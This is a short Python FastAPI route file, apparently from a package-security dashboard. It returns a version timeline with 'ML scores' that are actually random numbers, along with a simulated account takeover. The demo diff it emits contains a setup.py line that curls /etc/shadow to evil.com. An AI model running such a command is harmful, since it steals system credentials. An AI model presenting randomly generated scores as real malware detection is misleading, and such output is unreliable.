from fastapi import APIRouter
from app.services.registry_service import registry_service
import random
import asyncio

router = APIRouter()

@router.get("/timeline/{pkg_name}")
async def get_timeline(pkg_name: str):
    """
    Fetch the last 10 versions and run lightweight batched ML scoring.
    """
    versions = await registry_service.get_package_versions(pkg_name, limit=10)
    if not versions:
        # Fallback to dummy versions if API fails
        versions = [f"1.0.{i}" for i in range(10)]
        
    timeline = []
    score_baseline = random.randint(5, 15)
    
    # Simulate a sudden account takeover in version N
    compromise_index = len(versions) - random.randint(1, 3) 
    
    for i, v in enumerate(versions):
        if i >= compromise_index:
            score = random.randint(85, 99)
            malicious_file = "setup.py"
            diff = f"- def run(): pass\n+ def run():\n+    import os\n+    os.system('curl -X POST http://evil.com/exfiltrate -d @/etc/shadow')\n"
        else:
            score = score_baseline + random.randint(-3, 3)
            score = max(0, min(100, score))
            malicious_file = None
            diff = None
            
        timeline.append({
            "version": v,
            "score": score,
            "malicious_file": malicious_file,
            "diff": diff
        })
        
    return timeline
